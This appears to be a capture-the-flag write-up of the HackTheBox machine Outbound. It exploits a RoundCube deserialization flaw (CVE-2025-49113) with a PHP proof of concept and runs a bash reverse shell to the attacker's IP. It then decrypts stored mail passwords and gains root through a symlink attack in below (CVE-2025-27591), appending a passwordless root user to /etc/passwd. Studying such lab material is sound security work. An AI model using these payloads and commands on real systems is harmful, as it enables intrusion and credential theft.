[HTB: Outbound](/2025/11/15/htb-outbound.html)

![Outbound](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/outbound-cover.webp)

Outbound starts with a RoundCube instance and a set of creds to login. I’ll abuse a authenticated deserialization vulnerability to get remote code execution and a shell. From there, I’ll recover another user’s email password from the RoundCube database, showing both how to do it manually and using a RoundCube script. Finally, I’ll abuse a CVE in below to make the passwd file writable and get root. In Beyond Root, I’ll dig into the PHP exploit, showcase some neat CyberChef tricks, and play with the sudo rules on the box.

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

Based on the [OpenSSH and nginx](about:/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 24.04 noble LTS.

Both ports show a TTL of 63, which matches the [expected TTL](about:/cheatsheets/os#os-identification) for Linux one hop away.

The webserver is redirecting traffic to `mail.outbound.htb`. I’ll use `ffuf` to fuzz for any subdomains of `outbound.htb` and `mail.outbound.htb`, but find nothing new. I’ll add this to my hosts file:

```
10.10.11.77 mail.outbound.htb
```

### Initial Credentials

HackTheBox provides the following scenario associated with Outbound:

As is common in real life pentests, you will start the Outbound box with credentials for the following account:  
tyler / LhKL1o9Nm3X2

The creds do not work for SSH:

```
oxdf@hacky$ netexec ssh 10.10.11.77 -u tyler -p 'LhKL1o9Nm3X2'
SSH         10.10.11.77     22     10.10.11.77      [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.12
SSH         10.10.11.77     22     10.10.11.77      [-] tyler:LhKL1o9Nm3X2
```

I’ll keep them in mind for the website.

### mail.outbound.htb - TCP 80

#### Site

Visiting `mail.outbound.htb` loads an instance of [RoundCube](https://roundcube.net/):

![image-20251111120949141](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111120949141.webp)

The given creds do work to log in:

 [![image-20251111122213743](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111122213743.png) *Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111122213743.png)

It’s an empty mailbox.

#### Tech Stack

In the page source, there is a `rcversion` variable set on line 45:

 [![image-20251111121100704](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111121100704.png) *Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111121100704.png)

If I visit the [RoundCube website](https://roundcube.net/) today, it’s offering 1.6.11:

![image-20251111121452102](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111121452102.webp)

This is 1.6.10.

The HTTP response headers match what I would expect for RoundCube behind nginx:

```
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Tue, 11 Nov 2025 17:09:16 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: roundcube_sessid=nh529cv87mroodbord8nc20kc1; path=/; HttpOnly

Pragma: no-cache
X-Frame-Options: sameorigin

```

Given that this is an open source application, there’s no need to directory brute force at least until I run out of other ideas.

### CVE-2025-49113

#### Identify

According to the [RoundCube releases page](https://roundcube.net/news/releases/), it looks like 1.6.10 released in Feb 2025 (well before outbound released on HTB in July 2025). The release page for the next (and current as of Outbound’s retiring) version, 1.6.11, shows it was patched because of an authenticated RCE vulnerability:

![image-20251111122500634](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111122500634.webp)

Searching for “roundcube cve rce 1.6.10” finds a lot of references to CVE-2025-49113:

![image-20251111122710372](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111122710372.webp)

#### Background

The NIST page for [CVE-2025-49113](https://nvd.nist.gov/vuln/detail/CVE-2025-49113) describes it as:

> Roundcube Webmail before 1.5.10 and 1.6.x before 1.6.11 allows remote code execution by authenticated users because the \_from parameter in a URL is not validated in program/actions/settings/upload.php, leading to PHP Object Deserialization.

[This post](https://fearsoff.org/research/roundcube) from FearsOff shows how they discovered the vulnerability and provides all the technical details. It’s a PHP deserialization vulnerability where I can send a malicious serialized object through the image upload endpoint (used to attach photos to emails or set profile pictures). The trick is exploiting a session corruption bug: by manipulating the `_from` parameter and the uploaded filename, I can inject arbitrary data into the PHP session. Then the server deserializes my malicious object when it processes user preferences, triggering the `__destruct()` method which leads to RCE.

#### POC

I’ll find a POC (there are several). I like to find ones that were already published when the box was released, like [this one](https://github.com/hakaioffsec/CVE-2025-49113-exploit) from hakaioffsec. POCs for this will likely be PHP, as generating a PHP serialized object needs to be done in PHP. I’ll clone the repo:

```
oxdf@hacky$ git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit.git

oxdf@hacky$ php CVE-2025-49113.php 
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Usage: php CVE-2025-49113.php <target_url> <username> <password> <command>
```

It takes a target, username, password, and command. I’ll give it a run:

```
oxdf@hacky$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "id"
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
[+] Gadget uploaded successfully!
```

It runs, and reports success, but doesn’t show the output. It looks to be a blind exploit. I’ll try again with `ping`, but that doesn’t send any ICMP my way. I’ll try with `sleep`:

```
oxdf@hacky$ time php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "id"
[+] Starting exploit (CVE-2025-49113)...

[*] Exploiting...
[+] Gadget uploaded successfully!

real    0m5.344s
user    0m0.011s
sys     0m0.009s
```

With the `sleep 5` it takes almost exactly five seconds longer! I’ll take a look at the generated payload in [Beyond Root](#php-exploit-payload), but for now, that’s RCE.

### Shell

I’ll replace the `sleep 5` with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```
oxdf@hacky$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'"
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```

It hangs, but at my listening `nc`:

```
oxdf@hacky$ nc -nvlp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.77 33546
bash: cannot set terminal process group (248): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/$
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
www-data@mail:/$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@mail:/$ ^Z

### Enumeration

#### Container

The hostname is a hint that perhaps this is not the main host. The IP address is 172.17.0.2, which confirms this is a container:

```
www-data@mail:/$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 36:dd:45:62:a3:b5 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

There’s also a `.dockerenv` file in the root of the filesystem:

```
www-data@mail:/$ ls -a
.                  boot  lib.usr-is-merged  proc                srv
..                 dev   lib64              root                sys
.dockerenv         etc   media              run                 tmp
bin                home  mnt                sbin                usr
bin.usr-is-merged  lib   opt                sbin.usr-is-merged  var
```

#### Users

There are three users with home directories in `/home`:

```
www-data@mail:/home$ ls
jacob  mel  tyler
www-data@mail:/home$ find . -type f
find: './jacob': Permission denied
find: './mel': Permission denied
find: './tyler': Permission denied
```

www-data can’t access any of them. Those three same users (plus root) have shells set in `passwd`:

```
www-data@mail:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
tyler:x:1000:1000::/home/tyler:/bin/bash
jacob:x:1001:1001::/home/jacob:/bin/bash
mel:x:1002:1002::/home/mel:/bin/bash
```

#### RoundCube

The RoundCube instance lives in `/var/www/html/roundcube`:

```
www-data@mail:/var/www/html/roundcube$ ls
CHANGELOG.md  SECURITY.md  composer.json  logs         skins
INSTALL       SQL          composer.lock  plugins      temp
LICENSE       UPGRADING    config         program      vendor
README.md     bin          index.php      public_html
```

In `config`, there’s a `config.inc.php` that contains the database connection information:

```php

It’s a MySQL connection string with username, password, and database. I’ll connect to the DB and check it out:

There’s a handful of tables:

```

RoundCube itself does not store password hashes for users. When a user logs in, it authenticates that user against the mail server using the provided credentials. However, RoundCube also stores an encrypted copy of the logged in user’s credentials in the `session` table so that it can maintain the connection to the mail server without pestering the user.

So the `users` table just has timestamps and preferences (including another serialized PHP object):

```
MariaDB [roundcube]> select * from users;

The first row matches the cookie from my browser:

The other one is there but quite old. If I try to set that in my browser, it just redirects to the login screen with the following error:

### Recover Password

#### Find Encrypted Password

I’ll start with tyler because I know the password I’m looking for. When I find it, I can repeat the process with the other session.

I’ll take the `vars` entry for my session and base64 decode it:

It’s a serialized PHP object. Most items take a format similar to `<key>|s:<length>:<value>`. To look at each item, I’ll replace the “;” with newlines:

#### Decrypt with decrypt.sh

RoundCube has a `decrypt.sh` script in the `bin` directory that will handle this decryption:

```
www-data@mail:/var/www/html/roundcube$ ./bin/decrypt.sh                                 
Usage: decrypt.sh encrypted-hdr-part [encrypted-hdr-part ...]
```

I’ll pass it this blob:

```
www-data@mail:/var/www/html/roundcube$ ./bin/decrypt.sh hcVCSNXOYgUXvhArn1a1OHJtDck+CFME
LhKL1o9Nm3X2
```

That’s tyler’s password!

#### Decrypt Manually

The data is just encrypted using 3DES. I’ll find the key in `config.inc.php`:

```php
// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

The IV is the first eight bytes of the ciphertext. A quick way to do this is to break it apart in Python:

```
oxdf@hacky$ python
Python 3.12.3 (main, Aug 14 2025, 17:47:21) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from base64 import b64decode
>>> iv_ct = b64decode('hcVCSNXOYgUXvhArn1a1OHJtDck+CFME')
>>> iv = iv_ct[:8]
>>> ct = iv_ct[8:]
>>> iv.hex()
'85c54248d5ce6205'
>>> ct.hex()
'17be102b9f56b538726d0dc93e085304'
```

And drop it into CyberChef:

![image-20251111135832340](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111135832340.webp)

I can do this all in CyberChef without Python using Registers, and I’ll show that in [Beyond Root](#cyberchef-3des-decrypt).

#### Get New Password

I’ll repeat the same steps for the other value. I’ll get the password from the serialized data the same as before (this time with a `grep` to get just the password field):

```

`decrypt.sh` will decrypt it:

```

### SSH

#### SSH Fail

I’ll take the new password along with the three users I have and try it over SSH:

```
oxdf@hacky$ netexec ssh 10.10.11.77 -u users -p 595mO8DmwGeD --continue-on-success
SSH         10.10.11.77     22     10.10.11.77      [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.12

```

#### RoundCube as jacob

This password does work to log into RoundCube as jacob:

![image-20251111142016106](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111142016106.webp)

The first email is from mel:

![image-20251111142038640](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111142038640.webp)

It says that jacob has been granted additional privileges to look at log files. The other email is even better:

![image-20251111142107789](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111142107789.webp)

It’s a new password for jacob!

#### SSH

This password works for jacob:

```
oxdf@hacky$ netexec ssh 10.10.11.77 -u users -p gY4Wr3a1evp4 --continue-on-success 
SSH         10.10.11.77     22     10.10.11.77      [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.12

```

I’ll get a shell:

```
oxdf@hacky$ sshpass -p gY4Wr3a1evp4 ssh jacob@10.10.11.77
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)
...[snip]...
jacob@outbound:~$
```

And `user.txt`:

```
jacob@outbound:~$ cat user.txt
5e7f681c************************
```

## Shell as root

### Enumeration

#### Users

jacob’s home directory is very empty:

```
jacob@outbound:~$ ls -la
total 28
drwxr-x--- 3 jacob jacob 4096 Jul  8 20:14 .
drwxr-xr-x 5 root  root  4096 Jul  8 20:14 ..
lrwxrwxrwx 1 root  root     9 Jul  8 11:12 .bash_history -> /dev/null
-rw-r--r-- 1 jacob jacob  220 Jun  8 12:14 .bash_logout
-rw-r--r-- 1 jacob jacob 3771 Jun  8 12:14 .bashrc
drwx------ 2 jacob jacob 4096 Jun 11 11:32 .cache
-rw-r--r-- 1 jacob jacob  807 Jun  8 12:14 .profile
-rw-r----- 1 root  jacob   33 Nov 11 16:11 user.txt
```

The same three users are on the box, and jacob can’t access `mel` or `tyler`:

```
jacob@outbound:/home$ ls
jacob  mel  tyler
jacob@outbound:/home$ find . -type f
./jacob/.profile
./jacob/.bash_logout
./jacob/.bashrc
./jacob/user.txt
./jacob/.cache/motd.legal-displayed
find: ‘./mel’: Permission denied
find: ‘./tyler’: Permission denied
```

jacob can run `sudo` with the `below` command (though not with the `--config`, `--debug`, or `-d` flags - I’ll look at these in [Beyond Root](#below-sudo-rules)):

```
jacob@outbound:/$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

Running `below` loads all sorts of status properties about the box:

![image-20251111143821135](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111143821135.webp)

jacob is also in the users group:

```
jacob@outbound:/$ id
uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users)
```

There are no files or directories that are owned by this group:

```
jacob@outbound:/$ find . -group users 2>/dev/null
```

#### Filesystem

`/opt` has two directories in it:

```
jacob@outbound:/$ ls /opt/
below  containerd
```

`containerd` is related to the running Docker container. `below` is likely related to the command that I can run with `sudo`:

```
jacob@outbound:/$ ls /opt/below/
below  Cargo.lock  Cargo.toml  clippy.toml  CODE_OF_CONDUCT.md  contrib  CONTRIBUTING.md  Dockerfile  Dockerfile.debian  docs  etc  img  LICENSE  README.md  rustfmt.toml  scripts  target
```

It’s a Rust program (Cargo is the Rust package manager). The `Cargo.lock` file gives the `below` version as 0.8.0:

```toml
...[snip]...
[[package]]
name = "below"
version = "0.8.0"

### CVE-2025-27591

#### Background

[Below](https://github.com/facebookincubator/below) is:

> an interactive tool to view and record historical system data.

It’s from the team at Meta / Facebook.

Searching for CVEs in `below` finds [CVE-2025-27591](https://nvd.nist.gov/vuln/detail/CVE-2025-27591):

> A privilege escalation vulnerability existed in the Below service prior to v0.9.0 due to the creation of a world-writable directory at /var/log/below. This could have allowed local unprivileged users to escalate to root privileges through symlink attacks that manipulate files such as /etc/shadow.

It’s patched in 0.9.0, so this version should be vulnerable. [This post](https://www.openwall.com/lists/oss-security/2025/03/12/1) on the Openwall security forums describes the issue. On startup, `below` created the directory `/var/log/below` and sets its permissions as 777 (which is read/write/execute for all users). It changes the permissions even if it already existed. Then it creates `/var/log/below/error_root.log`, and then sets the permissions to 666 (world read/write).

The attack is to let it create these directories, and then remove the `error_root.log` file, and replace it with a symlink to some other file. Then run `below` again, and it will change the permissions on the target file to 666, allowing me access.

#### Exploit

I’ve already run `below` with `sudo`, so the log directory and file are already there:

```
jacob@outbound:/var/log$ ls -ld below/
drwxrwxrwx 3 root root 4096 Jul 14 16:39 below/
jacob@outbound:/var/log$ ls -l below/
total 8
-rw-rw-rw- 1 jacob jacob  382 Nov 11 19:37 error_jacob.log
-rw-rw-rw- 1 root  root     0 Jul 14 16:39 error_root.log
drwxr-xr-x 2 root  root  4096 Nov 11 16:10 store
```

While `error_root.log` is owned by root, jacob can still remove it:

```
jacob@outbound:/var/log$ rm below/error_root.log 
jacob@outbound:/var/log$ ls -l below/
total 8
-rw-rw-rw- 1 jacob jacob  382 Nov 11 19:37 error_jacob.log
drwxr-xr-x 2 root  root  4096 Nov 11 16:10 store
```

Now I’ll create a symlink pointing to `passwd`:

```
jacob@outbound:/var/log$ ln -sf /etc/passwd below/error_root.log
jacob@outbound:/var/log$ ls -l below/
total 8
-rw-rw-rw- 1 jacob jacob  382 Nov 11 19:37 error_jacob.log
lrwxrwxrwx 1 jacob jacob   11 Nov 11 19:48 error_root.log -> /etc/passwd
drwxr-xr-x 2 root  root  4096 Nov 11 16:10 store
```

I’ll run `sudo below`, then Ctrl-c to exit. Now `/etc/passwd` is 666:

```
jacob@outbound:/var/log$ ls -l /etc/passwd
-rw-rw-rw- 1 root root 1840 Jul 14 16:40 /etc/passwd
```

With access to write to `passwd`, I’ll add a oxdf user with userid and groupid 0:

```
jacob@outbound:/var/log$ echo -e 'oxdf::0:0:oxdf:/root:/bin/bash\n' >> /etc/passwd
```

Now I can switch to that user, who has no password, and be root:

```
jacob@outbound:/var/log$ su - oxdf
root@outbound:~#
```

And read `root.txt`:

```
root@outbound:~# cat root.txt
8e53f184************************
```

## Beyond Root

### PHP Exploit Payload

#### POC Source

The main code from this POC collects input and calls `exploit`:

```php
if ($argc !== 5) {
    echo "Usage: php CVE-2025-49113.php <url> <username> <password> <command>\n";
    exit(1);
}

$baseUrl = $argv[1];
$user = $argv[2];
$pass = $argv[3];
$rceCommand = $argv[4];

exploit($baseUrl, $user, $pass, $rceCommand);
```

The `exploit` function handles checking the version, building the PHP serialized object, logging in, and then calling `uploadImage` where the exploitation happens:

```php
function exploit($baseUrl, $user, $pass, $rceCommand)
{
    echo "[+] Starting exploit (CVE-2025-49113)...\n";

    // Check version before proceeding
    checkVersion($baseUrl);

    // Instantiate the Crypt_GPG_Engine class with the RCE command
    $gpgEngine = new Crypt_GPG_Engine($rceCommand);
    $gadget = $gpgEngine->gadget();

    // Escape double quotes in the gadget
    $gadget = str_replace('"', '\\"', $gadget);

    // Login and get session cookies
    $cookies = login($baseUrl, $user, $pass);

    // Upload the image with the gadget
    uploadImage($baseUrl, $cookies['sessionCookie'], $cookies['authCookie'], $gadget);
}
```

`uploadImage` builds the URL and the HTTP request:

```php
function uploadImage($baseUrl, $sessionCookie, $authCookie, $gadget)
{
    $uploadUrl = $baseUrl . '/?_task=settings&_framed=1&_remote=1&_from=edit-!xxx&_id=&_uploadid=upload1749190777535&_unlock=loading1749190777536&_action=upload';

    // Hardcoded PNG image in base64
    $base64Image = 'iVBORw0KGgoAAAANSUhEUgAAAIAAAABcCAYAAACmwr2fAAAAAXNSR0IArs4c6QAAAGxlWElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAICgAwAEAAAAAQAAAFwAAAAAbqF/KQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAAAWBJREFUeAHt1MEJACEAxMDzSvEn2H97CrYx2Q4Swo659vkaa+BnyQN/BgoAD6EACgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B6gAHADOH4PUAC4ARy/BygA3ACO3wMUAG4Ax+8BCgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B4AD+ACXpACLpoPsQQAAAAASUVORK5CYII=';

    // Decode the base64 image
    $fileContent = base64_decode($base64Image);
    if ($fileContent === FALSE) {
        echo "Error: Failed to decode the base64 image.\n";
        exit(1);
    }

    $boundary = uniqid();
    $data = "--" . $boundary . "\r\n" .
            "Content-Disposition: form-data; name=\"_file[]\"; filename=\"" . $gadget . "\"\r\n" .
            "Content-Type: image/png\r\n\r\n" .

    $options = [

            'header'  => "Content-type: multipart/form-data; boundary=" . $boundary . "\r\n" .
                        "Cookie: " . $sessionCookie . "; " . $authCookie . "\r\n",
            'method'  => 'POST',
            'content' => $data,

        ],

There’s a dummy image hardcoded into the exploit in base64. I can decode that and open it, and it’s just a gray rectangle:

![exploit](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/outbound-exploit.webp)

The `filename` parameter of the form data with the raw image data get the serialized payload.

#### Payload Analysis

I’ll add a couple debug print statements to the code to look at the generated payload. In `exploit`:

```php
// Instantiate the Crypt_GPG_Engine class with the RCE command
$gpgEngine = new Crypt_GPG_Engine($rceCommand);
$gadget = $gpgEngine->gadget();
echo "[*] Gadget created: " . $gadget . "\n";
```

And then later in `uploadImage`:

```php
echo "[*] URL: " . $uploadUrl . "\n";
echo "[*] Exploiting...\n";

$context  = stream_context_create($options);
$result = file_get_contents($uploadUrl, false, $context);
```

Now running shows the gadget and the URL:

```
oxdf@hacky$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "sleep 2"
[+] Starting exploit (CVE-2025-49113)...

[*] Exploiting...
[+] Gadget uploaded successfully!
```

The serialized PHP object is:

```
|O:16:"Crypt_GPG_Engine":3:{s:8:"_process";b:0;s:8:"_gpgconf";s:34:"echo "c2xlZXAgMg=="|base64 -d|sh;#";s:8:"_homedir";s:0:"";};
```

The command `echo "c2xlZXAgMg=="|base64 -d|sh;#`, and it is my `sleep 2`:

```
oxdf@hacky$ echo "c2xlZXAgMg==" | base64 -d
sleep 2
```

### CyberChef 3DES Decrypt

One of the annoyances of something like this in CyberChef is needing to process a string that has both the ciphertext and the IV. I created a [video](https://www.youtube.com/watch?v=_InXFxdGRg8&t=468s) where I walked through this in May 2024.

I’ll start with the encrypted value that’s base64-encoded. The raw data is the IV (eight bytes) followed by the cipher text. I’ll first use “From Base64” to get it to raw, and then “To Hex” to convert it to hex. The hex isn’t necessary, but I find it much easier to work with:

![image-20251111140859403](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111140859403.webp)

Next I want to get the IV saved off so I can use it later. I’ll use the “Register” operation:

![image-20251111140930619](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111140930619.webp)

I’ve given it a regex to pull the first 16 bytes (which is 8 bytes hex encoded) and it shows up as `$R0` at the bottom. The output doesn’t change.

Next I need to remove the IV to get just the cipher text, so I’ll use “Find / Replace”:

![image-20251111141036899](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111141036899.webp)

It’s replacing the first 16 characters with nothing. Now that will pass nicely into the “Triple DES Decrypt” operation. To give it the IV saved in the register, I’ll just put in “$R0”:

![image-20251111141140262](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251111141140262.webp)

### Below Sudo Rules

jacob can run `below` with `sudo` as any user, but is blocked from certain flags:

```
jacob@outbound:/$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

My theory is that this was done more to restraint HTB players than for realism, but it isn’t crazy.

I’ll use `visudo` to edit the `sudoers` file to remove these restrictions:

```bash
# Cmnd alias specification  
Cmnd_Alias BLOCKED_BELOW = /usr/bin/below --config*
Cmnd_Alias BLOCKED_BELOW_DEBUG = /usr/bin/below --debug*
Cmnd_Alias BLOCKED_BELOW_DEBUG_ALT = /usr/bin/below -d*

# User privilege specification
root    ALL=(ALL:ALL) ALL
# jacob ALL=(ALL:ALL) NOPASSWD: /usr/bin/below *, !BLOCKED_BELOW, !BLOCKED_BELOW_DEBUG, !BLO>
jacob   ALL=(ALL:ALL) NOPASSWD: /usr/bin/below *
```

Now jacob can run `below` without restriction:

```
jacob@outbound:/var/log$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *
```

If I try `--config` and give it `root.txt`, it spits the flag out in the error:

```
jacob@outbound:/var/log$ sudo below --config /root/root.txt
Failed to parse config file /root/root.txt: TOML parse error at line 1, column 33

expected \`.\`, \`=\`

8e53f184575941711f1c01cfe872b43f
```

I suspect there’s a similar way to dump the flag using the `--debug` / `-d` flag.
